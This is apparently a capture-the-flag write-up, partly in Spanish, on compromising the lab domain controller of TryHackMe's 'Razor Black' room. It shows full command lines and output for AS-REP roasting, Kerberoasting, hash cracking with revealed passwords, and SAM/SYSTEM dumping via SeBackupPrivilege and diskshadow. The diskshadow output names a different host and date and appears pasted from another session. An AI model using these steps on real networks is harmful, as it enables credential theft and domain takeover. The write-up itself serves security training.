---
tags:
title: Razor Black - Medium (THM)
permalink: /Razor-Black-THM-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 
zs1n@ptw ~> nmapf 10.65.181.222
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-25 14:12 -0400
Initiating Ping Scan at 14:12
Scanning 10.65.181.222 [4 ports]
Completed Ping Scan at 14:12, 0.32s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:12
Completed Parallel DNS resolution of 1 host. at 14:12, 0.50s elapsed
Initiating SYN Stealth Scan at 14:12
Scanning 10.65.181.222 [65535 ports]
Discovered open port 445/tcp on 10.65.181.222
Discovered open port 139/tcp on 10.65.181.222
Discovered open port 53/tcp on 10.65.181.222
Discovered open port 111/tcp on 10.65.181.222
Discovered open port 135/tcp on 10.65.181.222
Discovered open port 3389/tcp on 10.65.181.222
Discovered open port 2049/tcp on 10.65.181.222
Discovered open port 49665/tcp on 10.65.181.222
Discovered open port 593/tcp on 10.65.181.222
Discovered open port 49672/tcp on 10.65.181.222
Discovered open port 49664/tcp on 10.65.181.222
Discovered open port 49664/tcp on 10.65.181.222
Discovered open port 88/tcp on 10.65.181.222
Discovered open port 49668/tcp on 10.65.181.222
Discovered open port 464/tcp on 10.65.181.222
Discovered open port 49667/tcp on 10.65.181.222
Discovered open port 49671/tcp on 10.65.181.222
Discovered open port 47001/tcp on 10.65.181.222
Discovered open port 389/tcp on 10.65.181.222
Discovered open port 636/tcp on 10.65.181.222
Discovered open port 49688/tcp on 10.65.181.222
Discovered open port 49695/tcp on 10.65.181.222
Discovered open port 49669/tcp on 10.65.181.222
Discovered open port 5985/tcp on 10.65.181.222
Discovered open port 49705/tcp on 10.65.181.222
Completed SYN Stealth Scan at 14:12, 13.71s elapsed (65535 total ports)
Nmap scan report for 10.65.181.222
Host is up, received reset ttl 126 (0.17s latency).
Scanned at 2026-03-25 14:12:45 EDT for 14s
Not shown: 54120 closed tcp ports (reset), 11391 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE        REASON
53/tcp    open  domain         syn-ack ttl 126
88/tcp    open  kerberos-sec   syn-ack ttl 126
111/tcp   open  rpcbind        syn-ack ttl 126
135/tcp   open  msrpc          syn-ack ttl 126
139/tcp   open  netbios-ssn    syn-ack ttl 126
389/tcp   open  ldap           syn-ack ttl 126
445/tcp   open  microsoft-ds   syn-ack ttl 126
464/tcp   open  kpasswd5       syn-ack ttl 126
593/tcp   open  http-rpc-epmap syn-ack ttl 126
636/tcp   open  ldapssl        syn-ack ttl 126
2049/tcp  open  nfs            syn-ack ttl 126
3389/tcp  open  ms-wbt-server  syn-ack ttl 126
5985/tcp  open  wsman          syn-ack ttl 126
47001/tcp open  winrm          syn-ack ttl 126
49664/tcp open  unknown        syn-ack ttl 126
49665/tcp open  unknown        syn-ack ttl 126
49667/tcp open  unknown        syn-ack ttl 126
49668/tcp open  unknown        syn-ack ttl 126
49669/tcp open  unknown        syn-ack ttl 126
49671/tcp open  unknown        syn-ack ttl 126
49672/tcp open  unknown        syn-ack ttl 126
49688/tcp open  unknown        syn-ack ttl 126
49695/tcp open  unknown        syn-ack ttl 126
49705/tcp open  unknown        syn-ack ttl 126

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.69 seconds
           Raw packets sent: 132865 (5.846MB) | Rcvd: 55606 (2.224MB)
-e [*] IP: 10.65.181.222
[*] Puertos abiertos: 53,88,111,135,139,389,445,464,593,636,2049,3389,5985,47001,49664,49665,49667,49668,49669,49671,49672,49688,49695,49705
/usr/bin/xclip
-e [*] Service scanning with nmap against 53,88,111,135,139,389,445,464,593,636,2049,3389,5985,47001,49664,49665,49667,49668,49669,49671,49672,49688,49695,49705 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-25 14:12 -0400
Nmap scan report for 10.65.181.222
Host is up (0.18s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-25 18:13:03Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RAZ0RBLACK
|   NetBIOS_Domain_Name: RAZ0RBLACK
|   NetBIOS_Computer_Name: HAVEN-DC
|   DNS_Domain_Name: raz0rblack.thm
|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm
|   DNS_Tree_Name: raz0rblack.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2026-03-25T18:14:02+00:00
|_ssl-date: 2026-03-25T18:14:10+00:00; -5s from scanner time.
| ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm
| Not valid before: 2026-03-24T18:12:29
|_Not valid after:  2026-09-23T18:12:29
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -5s, deviation: 0s, median: -5s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-03-25T18:14:03
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 203.85 seconds
```


```bash
zs1n@ptw ~> impacket-smbclient raz0rblack.thm/@HAVEN-DC.raz0rblack.thm -no-pass -dc-ip 10.65.181.222
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# shares
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
```

```bash
zs1n@ptw ~> showmount -e 10.65.181.222
Export list for 10.65.181.222:
/users (everyone)
```

```bash
zs1n@ptw ~> sudo mount -t nfs 10.65.181.222:/users /mnt/mount
```


```bash
─# ls
employee_status.xlsx  sbradley.txt

┌──(root㉿kali)-[/mnt/mount]
└─# cat sbradley.txt
��THM{ab53e05c9a98def00314a14ccbfa8104}
```

```bash
zs1n@ptw ~> # Borrar el intento fallido anterior
sudo rm -rf excel_data

# Crear y descomprimir con privilegios
mkdir excel_data
sudo unzip employee_status.xlsx -d excel_data/
Archive:  employee_status.xlsx
  inflating: excel_data/[Content_Types].xml
   creating: excel_data/_rels/
  inflating: excel_data/_rels/.rels
   creating: excel_data/docProps/
  inflating: excel_data/docProps/app.xml
  inflating: excel_data/docProps/core.xml
  inflating: excel_data/docProps/custom.xml
   creating: excel_data/xl/
   creating: excel_data/xl/_rels/
  inflating: excel_data/xl/_rels/workbook.xml.rels
  inflating: excel_data/xl/sharedStrings.xml
  inflating: excel_data/xl/styles.xml
   creating: excel_data/xl/theme/
  inflating: excel_data/xl/theme/theme1.xml
  inflating: excel_data/xl/workbook.xml
   creating: excel_data/xl/worksheets/
  inflating: excel_data/xl/worksheets/sheet1.xml
```

```bash
zs1n@ptw ~> cat sharedStrings.xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="27" uniqueCount="22"><si><t>HAVEN SECRET HACKER's CLUB</t></si><si><t>Name's</t></si><si><t>Role</t></si><si><t>daven port</t></si><si><t>CTF PLAYER</t></si><si><t>imogen royce</t></si><si><t>tamara vidal</t></si><si><t>arthur edwards</t></si><si><t>carl ingram</t></si><si><t>CTF PLAYER (INACTIVE)</t></si><si><t>nolan cassidy</t></si><si><t>reza zaydan</t></si><si><t>ljudmila vetrova</t></si><si><t>CTF PLAYER, DEVELOPER,ACTIVE DIRECTORY ADMIN</t></si><si><t>rico delgado</t></si><si><t>WEB SPECIALIST</t></si><si><t>tyson williams</t></si><si><t>REVERSE ENGINEERING</t></si><si><t>steven bradley</t></si><si><t>STEGO SPECIALIST</t></si><si><t>chamber lin</t></si><si><t>CTF PLAYER(INACTIVE)</t></si></sst>
```


```bash
zs1n@ptw ~> impacket-GetNPUsers   raz0rblack.thm/twilliams -no-pass
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

[*] Getting TGT for twilliams
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:dace9a9c0fa295656767562ee32ef345$fb8e23449d180a6fb7958f185619039b4fdb37a94fa46687520ea5a873dc5a6e5b5c65c4cf816aff07a69a1e969834a4166e8939b9a91b349ac4d1a676b6d077389ceee7d612c9288abb640e36c8b16093548850357ee51b3b5698e24229c82d3dc019bd3f187828309ba7c86e425ceff22c21f30b86a8be166c6c36885287d6e2588fc3594a7d1d677c9d536e6cd53e05f948f15990edcdd6ec734e30c2f93d79fa07f4c3d414822219032f24b1fad45f78b1aa71a170f839f5c4c970092a9d194ba6266a735be9132e563d4c28b59cba3a126d7f1f3d17b7e29af9beb23cd0db7556d9190f9290bb8abefe64ad3b60
```

```bash
zs1n@ptw ~> j hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
roastpotatoes    ($krb5asrep$23$twilliams@RAZ0RBLACK.THM)
1g 0:00:00:02 DONE (2026-03-25 14:26) 0.3676g/s 1552Kp/s 1552Kc/s 1552KC/s robaviejas..roadblock714
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```bash
zs1n@ptw ~> nxc smb 10.65.181.222 -u 'twilliams' -p 'roastpotatoes' --rid-brute
SMB         10.65.181.222   445    HAVEN-DC         [*] Windows 10 / Server 2019 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.65.181.222   445    HAVEN-DC         [+] raz0rblack.thm\twilliams:roastpotatoes
SMB         10.65.181.222   445    HAVEN-DC         498: RAZ0RBLACK\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.65.181.222   445    HAVEN-DC         500: RAZ0RBLACK\Administrator (SidTypeUser)
SMB         10.65.181.222   445    HAVEN-DC         501: RAZ0RBLACK\Guest (SidTypeUser)
SMB         10.65.181.222   445    HAVEN-DC         502: RAZ0RBLACK\krbtgt (SidTypeUser)
SMB         10.65.181.222   445    HAVEN-DC         512: RAZ0RBLACK\Domain Admins (SidTypeGroup)
SMB         10.65.181.222   445    HAVEN-DC         513: RAZ0RBLACK\Domain Users (SidTypeGroup)
SMB         10.65.181.222   445    HAVEN-DC         514: RAZ0RBLACK\Domain Guests (SidTypeGroup)
SMB         10.65.181.222   445    HAVEN-DC         515: RAZ0RBLACK\Domain Computers (SidTypeGroup)
SMB         10.65.181.222   445    HAVEN-DC         516: RAZ0RBLACK\Domain Controllers (SidTypeGroup)
SMB         10.65.181.222   445    HAVEN-DC         517: RAZ0RBLACK\Cert Publishers (SidTypeAlias)
SMB         10.65.181.222   445    HAVEN-DC         518: RAZ0RBLACK\Schema Admins (SidTypeGroup)
SMB         10.65.181.222   445    HAVEN-DC         519: RAZ0RBLACK\Enterprise Admins (SidTypeGroup)
SMB         10.65.181.222   445    HAVEN-DC         520: RAZ0RBLACK\Group Policy Creator Owners (SidTypeGroup)
SMB         10.65.181.222   445    HAVEN-DC         521: RAZ0RBLACK\Read-only Domain Controllers (SidTypeGroup)
SMB         10.65.181.222   445    HAVEN-DC         522: RAZ0RBLACK\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.65.181.222   445    HAVEN-DC         525: RAZ0RBLACK\Protected Users (SidTypeGroup)
SMB         10.65.181.222   445    HAVEN-DC         526: RAZ0RBLACK\Key Admins (SidTypeGroup)
SMB         10.65.181.222   445    HAVEN-DC         527: RAZ0RBLACK\Enterprise Key Admins (SidTypeGroup)
SMB         10.65.181.222   445    HAVEN-DC         553: RAZ0RBLACK\RAS and IAS Servers (SidTypeAlias)
SMB         10.65.181.222   445    HAVEN-DC         571: RAZ0RBLACK\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.65.181.222   445    HAVEN-DC         572: RAZ0RBLACK\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.65.181.222   445    HAVEN-DC         1000: RAZ0RBLACK\HAVEN-DC$ (SidTypeUser)
SMB         10.65.181.222   445    HAVEN-DC         1101: RAZ0RBLACK\DnsAdmins (SidTypeAlias)
SMB         10.65.181.222   445    HAVEN-DC         1102: RAZ0RBLACK\DnsUpdateProxy (SidTypeGroup)
SMB         10.65.181.222   445    HAVEN-DC         1106: RAZ0RBLACK\xyan1d3 (SidTypeUser)
SMB         10.65.181.222   445    HAVEN-DC         1107: RAZ0RBLACK\lvetrova (SidTypeUser)
SMB         10.65.181.222   445    HAVEN-DC         1108: RAZ0RBLACK\sbradley (SidTypeUser)
SMB         10.65.181.222   445    HAVEN-DC         1109: RAZ0RBLACK\twilliams (SidTypeUser)
```


```bash
zs1n@ptw ~> impacket-GetUserSPNs raz0rblack.thm/twilliams:roastpotatoes -usersfile users -dc-ip 10.65.181.222
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$18$krbtgt$RAZ0RBLACK.THM$*krbtgt*$a36b02c5cbef1d1a19ebb5ea$ed3b2e2785dfdbebcabb311b5b0616322d30baaf7cd6401180a272b9cb0669a749f637eafc0c985ba455fa2e23f3b9d3b3f910f4b6de4d7e37e98e7ff6380f8cda07bb572cb412ed47d6c6a99efe50657ba21032523f6087b8efb84a894f04c2e836c93d640782df4bf85df192b9573b816c234951683387016ad308f0c861e07c5027b99f7a56c76e07961518c3a7dcc44bca4b0627a46e09acfde4b41bdf2b6693088f94c3ab1447a0cd1880e9a9ee5dd6bfa4069522d22becd8adb8a282545ef3f667ef9512b9942cc55ef19108adf4abbe4fb7c0753a0ab419a96259846c9a70cabef6c072d4e64895ac559487916597b5ba1ce0507c1218658a0189611761ecfd1157118df0a69a05ac05a9215c49eb0766fa1977182aeab9826b8b989dbbe02ed918d468514db855870c0727cadde20a68e400340cd6c096c4a0677ac83029420a25ab289fe0f644a8ed505eb16cbca3dcb029fa1d19cdd047484680d6e3247487aadda8b3ca776fa1c4e8ca1e055e74b8e2fff8e82fec5fc1d848740daef8305c7de7ca34a8c8f0c87e76128058113ffcd621e902fecc2f3f0970b44b7003f3dbdbc3faee91b414424f30a4791febf8e7defbc9bf323067bcb20d1bcd0424d42056c679d565b9193027faa4cbadb31521f65eb17616d771a7649bbcad8808d8e65aef9f5621694572f59ca3dbd2cd15aa3440753767acacdecc0091587fae5b8a03991a337461e3d0b4cba475853a9b460fef8472bf2c18fc457ea5cc4645d9230bf3892a727b2716bc1730f68381cf65396c49b7dce852a50989ae0bb112e0ba47317071af20ebd898fd50b9129bf98a06261ac185e03df7aafd7aea7e821a4e01aab67518e12ef822d81774a19b8e41ed63c1e3e48b529e7383dd20000bb210203c1c4418ec699f0d75719651378b5c54f9ce4654c1940df53a15510bf728a75aacd497547e736d6cb7d2744280fd653787d651676fda3f6b92ea71c3964abf8242dab41dc5d5c77c6325f095278dd18d75812b07249c1daf38fad3982949852d173c6695268ead57e130ffc01a153a66e9ac53398097a1b66009c12e4067a29d5a2738ff2aebd626bdcef390b87e17aff604159f4c8f853cb2a3d9eb448cc4f4dff50259cbfec94a87205ce46702b265123d6847ad30de9ce401d0f234da2a0ec7a16b78d6a348d9b29cc056685aa3422626214084b9d8b83f60c3fc6b117571b705a2eeea5d35ce3d9255f275fe689e2dda52507c5acc38b4c8d881537003fe0508403e1bbec6d948c3b00cb3a18917600eec0ac5af5062778b947f8774da917e6ff336e4204810b9faa9b1049a4d3d1c09744b67a6fe3e1f320077a927e2eefd8f27c98b5d5e913d8907
$krb5tgs$18$HAVEN-DC$$RAZ0RBLACK.THM$*HAVEN-DC$*$48436582b735073cf9fc64c8$ba2c9e2ce28f12b359c9947ebac4847551bfb0a4ae12377c6a75e6f5591b1ca5a47e2575a3ab2b60da67169295c583d554eff71326d9ebd93f2db659c71273f89faf861a786b5da81846fdbea318739639d68617b9182a0fafe3fc8a872498932f546b890a13bab2390cdc53e0ea71d077b0dca3a16832abd7608e76e31731b4693f622dfa052825035b50a4780271f22936ce8706c82571a056757fd647308dec6b07280dfd5275b69560782538c3a10ca67373a02035a55dbddceaeb78f9cce5e07209d36c473f3888d9c04d85c954f00322f3cc31c897a3a7f51e4df1136ec6b1b052fb2b747866b6770e5d31989070bd653f374b8180fc9d4548355df56dc707394af8940f1511bd112715360f197f14933cf87155a9e8a02f98478aa9201137a4da4fe84365c52ebf75ca57af0b2cc15a6cc3d7df552a41ed4f3aa324d20ef991e5d45273e34f6845afa7adb3c12ebfa95d09a4ee3f9e9b12d3f901d04b861c2e29774f154a29e75eba15cd46101fd793b30b909485469159c589c57758613853fd91271802cd4a2948e4ec048ac5e9985e300f8253826b1d3c50a98693212473ed172318abf0bab9cbc502ef132457bce2bd5b9de75e25477b70b6d64accc69d4601e610c3182ba799de68077cc9809480f23e3b1fa792398dbe3debd130201dcd605262a486283383747868c147a676cdf94a13afa33fcb1c4d505113e19ba8ddcc22aa505fb621b1087a4c8ecf5a78a0028eaed2437fd17c2d3d95befe9a2b9e38f55644998fc4183767ec9d1af9257100463b8a3511608e91ce56e3e756d41c496454e18a312e4d8c2a16e4001cd0d9305d05373629523cfc205d34c58cabb5a157a2d1c6ec1fea5a085dcef704d176b9a26b33b44786fdc88f5a4d685eee7f007dbc8daa6380fa705a62e641e4f768a0edb48598118b4e0716504f0faeb191675038633310c0c5e52bbbb4645834fb97cb2980a28a724ab2ab56f15cc3ff978f280badc5b7ec4d39d7b9c801ddaa77f2d9df7486f7f4e04048f703cedc4d1975d0495e9d954b6f3ab496cbc5d878eccd0fac1db3cf3e2aba94974310df20f3d362807d65b915d86fa6c775d11b5c40e61d276b00090335cb8a8a1ca9375ee798aca06dbc2b55ef7bb0d9b13bcf31b08ddc669c6b56233793ba22c8743ec3ae2e1875431a43a5dd6d80a32409c9e03ff4dfc30c590f2256c2932d44292a3b7b66a12febebaf550a157364591c63c018b19d5bb97ff5d768705380001234148a4efb7814aa9eca2120863387d8dc4b566d731edfa8ece5a30c2926c7abfe08ec0aec21f363726a359f7dea40a22466e5da73dab7df78383fe2ef9dcb0bf4528b23bb05806a8883e2920ed3a058ec22a86374dd45e50a022c89de5a9a40035337cb3fc117beda04ae7c658bd8
$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$xyan1d3*$0eb6d0ff182ad7c68de60f3e51dde59f$788103d0c65925df57cc6ec92f35ffb18ada9f01ea595ec414725da2848a682b2ffd9ded60e3bbd1956932c34938c34a556a65273337b41e51701dd9b972e25d904421d912d00bc0d059b7718c66a730bb3b247bfedb689fc21884d57a62bb0d045fc0adfd46c00ef74143ef8cdba154426022733a625e53e08826475e7c318f688f1959f184450b5a615cc69cbb0aacfc73ccbf3a33f9134b62aff26344354880ca6b69a755684125f447acab9bbbf4ec4d3840c45088e315d2dd98465896adb44b2c7bf590283c1c2b3cd58ef8f0dbff411e3547d79e90b3226c26896ae804e1e58ef2e738548668e5a425ff61a3985240772bb73df37f7a018f0845ee0c7b196c286d8a963f584c736c23d452f2bcb9b479ec309b8525fb1b7af39cb3612ca13ae60196b498138215c1a622d5b8e987ec7b22512046a16e3affc3a3fe2b0f9eb74239b1cb0cdf4fbbde12a24a1b3e8fb40c9f03b2eef6c63e7fc35f7a72a20346e82cf72b4e162d75d0d1aa89a49e5d613a4de843753c1481ad6d53447fa62e7d8de51232a727b86914bfc801da6080c1e0377060c1452f013c349f5f2c0a414afb5ab271c807f28f7ec9fd357068f85bbf529f419aac0008d408daceb0652746cb4ef6a5d81d290dd65d465b49af89bc9b1814203f09df1f7b6147bf2f3ca740149537ed3c0b51caae3b84067404b20dd2dd7b129d4424d162cc1547f5910a2017b0379784c89ebd5b835b9fa7d3db7d1b65d8081961fc80c26b516fc81c639cfa8277dcce86e7f927333f85bbbfae6abe3d279d423e36892f96cbe4bd708f73042428d812b839682ae6816347df1e68a748cd080c48684e6bf326648a26ef30ccacf7e50625aa32fa465e2a35019dd57221a90e21774c3893da222100f834f17429628608e6d27aa96ffd433236533fbb65312a8e46020a69cf8847e2ee7c56ae541bf3d5c3cecadcea53b95f1fd980b1592cbdaa04a8b74799bf03b064fd24c717ac2dddd58141f9a81e86d5adfe192b5e8abd68ce2f02bdbdb84d1d5620aa829720719d1cf05b7f6974171465efad9af1628743cc9b878d4bbcb716ad3f788346c050f84f407f7b16a311d50173bc62ac0becc2ce56b99984f0c5727270ffaaa4ea0e5bdb8a0a677f164168be62f76c79699c5d95bf84e08944b210b86cb656ab736fdb56d874247bc0b430acb69a65e0f5fb09c01c1da8e896a4fb50520a9f71e87e9595c74a059ce666c8d4fa3105a04dfd45f77f30d1157e1db5d8eb82f4039915387a9868ac96d901cd6fefba828ea77e37c0418a6e5be6152ca945c12adba7a01d540da08e7c3d44487bb7070706cd32c6b8e5525bcc8c699ba51ae4b37aa76bc9976f3809b38d07263fa66a0b95d29e2fba3047c98578ce1189366fd42cebd49a056b161f6aee3928fb
[-] Principal: lvetrova - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: sbradley - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: twilliams - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
```

```bash
zs1n@ptw ~> j hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cyanide9amine5628 (?)
1g 0:00:00:04 DONE (2026-03-25 14:30) 0.2415g/s 2141Kp/s 2141Kc/s 2141KC/s cybermilk0..cy2802341
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```bash
zs1n@ptw ~> rusthound-ce -d raz0rblack.thm -f HAVEN-DC.raz0rblack.thm -i 10.65.181.222 -u xyan1d3 -p 'cyanide9amine5628' -z -c All
---------------------------------------------------
Initializing RustHound-CE at 14:33:39 on 03/25/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-03-25T18:33:39Z INFO  rusthound_ce] Verbosity level: Info
[2026-03-25T18:33:39Z INFO  rusthound_ce] Collection method: All
[2026-03-25T18:33:39Z INFO  rusthound_ce::ldap] Connected to RAZ0RBLACK.THM Active Directory!
[2026-03-25T18:33:39Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-03-25T18:33:40Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-25T18:33:42Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=raz0rblack,DC=thm
[2026-03-25T18:33:42Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-25T18:33:44Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=raz0rblack,DC=thm
[2026-03-25T18:33:44Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-25T18:33:47Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=raz0rblack,DC=thm
[2026-03-25T18:33:47Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-25T18:33:47Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=raz0rblack,DC=thm
[2026-03-25T18:33:47Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-25T18:33:47Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=raz0rblack,DC=thm
[2026-03-25T18:33:47Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-03-25T18:33:47Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
[2026-03-25T18:33:47Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-03-25T18:33:47Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-03-25T18:33:47Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-03-25T18:33:47Z INFO  rusthound_ce::json::maker::common] 8 users parsed!
[2026-03-25T18:33:47Z INFO  rusthound_ce::json::maker::common] 60 groups parsed!
[2026-03-25T18:33:47Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-03-25T18:33:47Z INFO  rusthound_ce::json::maker::common] 2 ous parsed!
[2026-03-25T18:33:47Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-03-25T18:33:47Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-03-25T18:33:47Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-03-25T18:33:47Z INFO  rusthound_ce::json::maker::common] .//20260325143347_raz0rblack-thm_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 14:33:47 on 03/25/26! Happy Graphing!
```

```powershell
*Evil-WinRM* PS C:\users\xyan1d3\appdata\roaming\microsoft\protect\S-1-5-21-3403444377-2687699443-13012745-1106> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\users\xyan1d3\appdata\roaming\microsoft\protect\S-1-5-21-3403444377-2687699443-13012*Evil-WinRM* PS C:\users\xyan1d3\appdata\roaming\microsoft\protect\S-1-5-21-3403444377-2687699443-13012
745-1106>
*Evil-WinRM* PS C:\users\xyan1d3\appdata\roaming\microsoft\protect\S-1-5-21-3403444377-2687699443-13012745-1106> reg save HKLM\sam C:\programdata\sam
The operation completed successfully.

*Evil-WinRM* PS C:\users\xyan1d3\appdata\roaming\microsoft\protect\S-1-5-21-3403444377-2687699443-13012*Evil-WinRM* PS C:\users\xyan1d3\appdata\roaming\microsoft\protect\S-1-5-21-3403444377-2687699443-13012745-1106> reg save HKLM\system C:\programdata\system
The operation completed successfully.
```


```bash
cat zsln.txt 
set context persistent nowriters 
add volume c: alias zs1n 
create 
expose %zs1n% z: 
```
## Copy

El mismo lo transfiero a la maquina, y con `diskshadow` y el parámetro `/s` le paso el script.

```powershell
*Evil-WinRM* PS C:\Temp> diskshadow /s zsln.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  12/19/2025 6:59:08 AM

-> set context persistent nowriters
-> add volume c: alias zs1n
-> create
Alias zs1n for shadow ID {958cced4-1f97-425c-9ed7-617debec4b8d} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {a195cdc9-b679-45d5-b5f3-18a26100b167} set as environment variable.

Querying all shadow copies with the shadow copy set ID {a195cdc9-b679-45d5-b5f3-18a26100b167}

        * Shadow copy ID = {958cced4-1f97-425c-9ed7-617debec4b8d}               %zs1n%
